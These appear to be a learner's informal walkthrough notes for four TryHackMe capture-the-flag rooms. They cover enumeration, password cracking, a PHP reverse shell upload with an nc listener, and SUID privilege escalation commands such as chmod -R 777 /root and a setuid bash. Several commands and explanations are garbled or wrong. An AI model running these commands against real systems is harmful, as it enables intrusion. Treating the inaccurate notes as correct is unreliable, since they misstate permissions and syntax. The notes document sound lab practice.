Try HackMe--> https://tryhackme.com/dashboard

Pickle Rick [solved]
============
Launch Attacking machine in tryHackMe
enumerate machine with NMAP  --> nmap -T5 -p- -sV -vv 10.10.70.30 -oA nmap
	Found two services running 1) Openssh 7.2p2 2) running on 22 port, Apache 2.4.18 running on 80 port
	
	searched exploits for Openssh 7.2

	Below exploits did not work
	===============================================
	msf > use auxiliary/scanner/ssh/ssh_enumusers
	msf auxiliary(ssh_enumusers) > show actions
    	...actions...
	msf auxiliary(ssh_enumusers) > set ACTION < action-name >
	msf auxiliary(ssh_enumusers) > show options
    	...show and set options...
	msf auxiliary(ssh_enumusers) > run
	================================================

	Not tried this, need to try next time
	======================================================
	msf > use auxiliary/scanner/http/apache_optionsbleed
	msf auxiliary(apache_optionsbleed) > show actions
   	 ...actions...
	msf auxiliary(apache_optionsbleed) > set ACTION < action-name >
	msf auxiliary(apache_optionsbleed) > show options
    	...show and set options...
	msf auxiliary(apache_optionsbleed) > run
	========================================================

	Apache running on port 80, so open webserver on web browser--> nothing found in front page/UI
	view page source-> found username "RickRul3s
	open robots.txt-> found some random alphanumeric value   (guessing this as password)

	Next find sub directories , using DirBuster, Gobuster tools-- > Found login.php page exists
	-------------------------------------------
	dirb http://10.10.70.30 /usr/share/wordlist.txt
	-----------------------------------------
	Try login via browser-  http://10.10.70.30/login.php, -> username as we found during view page source and password guessed from Robots.txt
	Login success
	Found command input page in webserver, check which are OS commands working, E.g cat, ls, find, home,grep,less, pwd, head,tail
	Found that except pwd, ls, less remaining commands not working
	output of pwd-?/var/www/html
	output of ls-> found clue.txt, and Suser3* file
	try to see content of clue,txt using less command (cat command not working so) -> less clue.txt

	From the clue.txt  found string, to get ingredients navigate throught file systems
	Try seeing content of Suser3* file-> lss Suser3* file-> Found First ingredient

	search for home directory
	less /home-> Found Rick directory
	inside Rick directory (less /home/Rick) found 2nd ingredient)-> less /home/Rick/"second ingredients"
	
	//check for super user permission
	sudo -l   ---> Found (ALL) NOPASSWORD:ALL  ---> means any user can run any command without login required

	sudo file format as below
	[Any user] [any host]:[on behalf of any user] [any command]
	meaning of above is, any user on any host can run any command on behalf of any user

	search in root directory, to search in root directory normal user need super user permission, in sudo file format if permission given for execute any command y any user then
	sudo ls /root--> found 3rd.txt file
	contents of 3rd.txt file given 3rd ingredient ( sudo lss /root/3rd.txt

=====================================================================================================================
Boiler CTF

enumerate machine with NMAP  --> nmap -T5 -p- -sV -vv 10.10.100.67 -oA nmap
	ftp anon Anonymous login 
	ftp port 21 open vsftpd 3.0.3

	try ftp login as username Anonymous
		ftp 10.10.100.67
	After login success
	ftp>ls ---> to list file, does not see any files here
	
	search for hidden files
	ftp> ls -la--> found .info.txt
	
	Download  .info.text
	fp> get .info.txt

	ftp>exit

	>cat .info.txt--> found some encoded value
	Try decode using cyberchef website  https://gchq.github.io/CyberChef/
	

	//To find what service running on port 10000
	nmap -p100000 10.10.100.67

	10000/tcp http Minserve 1.930 (Webmin httpd)
	
	//To find exploitable
	google for any available exploits and also can search using searchsploit

	
	//find highest port and service

	//To find what CMS running on webserver
	use gobuster 
	>gobuster dir http://10.10.100.67/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 25

	//based on hint enumerate further
	>gobuster dir http://10.10.100.67/joomla/ -w /usr/share/dirb/wordlists/medium.txt -t 25

	During enumeration we get unusual files like , file starts with _, try ccess that path in browser, we get index page

	search on sar2html and also catthat file and see what we get information
	got credentials , try ssh
	ssh bastard@10.10.100.67 -p 5500 and enter password when prompt
	after login search for any interesting file-> .secret file-> cat this file-> get another user credentials
	ssh to second user account, and list files, get backup.sh file, cat it and get flag
	
	if any file has suid bit set and if any normal user executes that file , that normal user get inherits the suid property
	in linux find command searches all files from root level

	umask command in linux for assign permissions
	suid for directory is 4, files 2, sticky bit 0
	so find which file permission is set with suid--> find / -perm /4000 2>/dev/null
	 ( where 4000- 4 is to check which directory have set suid , 000 is file permission by default for files 666, drectory permission by default 777)

	/usr/bin/find  is having suid, othes are like false positive

	To become effective user, 1) run any command with /usr/bin/find  or 2) add current user as sudo 3) change file permission to 777
	> /usr/bin/find . -exec chmod -R 777 /root \; 
	>ls -al /root
	>cat root/root.txt----> get the flag

==============================================================================================================================
Cyborg 

	Nmap IP address
	visit website, view page source, search for any info- no interesting information
	Directory bruteforcing
	Got admin panel, found Alex is user, enumerate more on the website, got clues like squidfroxy, music-archive
	Download tar file t see whats inside
	in readme file from downloaded tar  has URL
	From dirbuster search found /amin and /etc folder
	Navigate to /etc from browser, found squid (which has hashed password ) /passwd,
	search $apr1$ in google- found like it  apache generated algorith password- MD5
	use hashcat to decrypt
	hashcat -h | grep apr1   --->  found that 1600
	hashcat -a 0 -m 1600 hash rockyou.txt --force   (where has is hash value we found and stored with file name as hash)-- got password as "squidward"
	Previously we gor URL from read me file, in that we have URL, navigate to that URL in browser
	from above URL, we see some installation steps of borgbackup, follow installation step provided in installation tab
	After installation , extract music-archive which e have unzipped earlier
	from linux machine search , borg -h and man borg- > found usage syntax -> borg extract /path/to/repo/:password
	>borg list /path/to/repo/:Music-archive-> found note.txt-> cat this file-> found Alex user credentials
	ssh to alex@ipaddess   -> enter password when prompt for
	After login found user.txt file which is a flag

	next step is get root access
	sudo -l  ( to find anything alex run with root privilizes) -> got /etc/mp3backups/backup.sh
	cd to /etc/mp3backups and cat backup.sh
	Found cmd=$command , c $command , we can execute command like >sudo backup.sh -c whoami -> shows as root
	//To make privilize escLtion
	>sudo backup.sh -c /bin/bash /   --> success of privilize escalation for /bin/bash
	After privilize escalation check for whether we became root user?
	>whoami  //not shown any output, may be working

	Another way to see content of root.txt as follows
	> cat root/root.txt /root/flag.txt   // to make loacl copy

	create suid to execute as root user to see content of root.txt
	>chmod 4577 /bin/bash     //giving root permission for /bin/bash to execute commands as root
	exit from current directory enter >exit
	
	//switch to bash 
	>bash -p   //bash interactive shell
	>whoami   //output shown as root , so we are good to go for read root.txt

	cd /etc/mp3backups
	>ls

	repeat agin
	>chmod 4577 /bin/bash 
	
	>bash -p   //bash interactive shell
	>whoami   //output shown as root , so we are good to go for read root.txt
	
	=====================================================================================
	RootMe
	
	visit website, view page source
	nmap -sC -sV -oN scan 10.10.104.71
	gobuster search -?  /upload  --> we can upload malicious file
	https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
	from above link download php malicious filesave as pp5 , change IP address and port
	Then upload, if upload success
	
	bash
	>nc nvlp 1337 
	
	//click on uploaded malicious file over server/application and see u get reverse shell

	upgreade our shell
	search  How to get linux shell using python
	https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

	python -c 'import pty; pty.spawn("/bin/bash")'

	search for flag file
	find / type -f -name user.txt
	cat /var/www/user.txt    //got flag


	escalate user privilizes to get as root
	>find / type f -user root -perm 4000 2>/dev/null

	https://gtfobins.github.io/     //Priilege escalations docs  , type python  and select SUID
	will get below command 
	./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

	from find command we got /usr/bin/python   so modify above command as belo & run
	
	./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
	then we get root permission

	cat root/root.txt

====================================================================================================
	

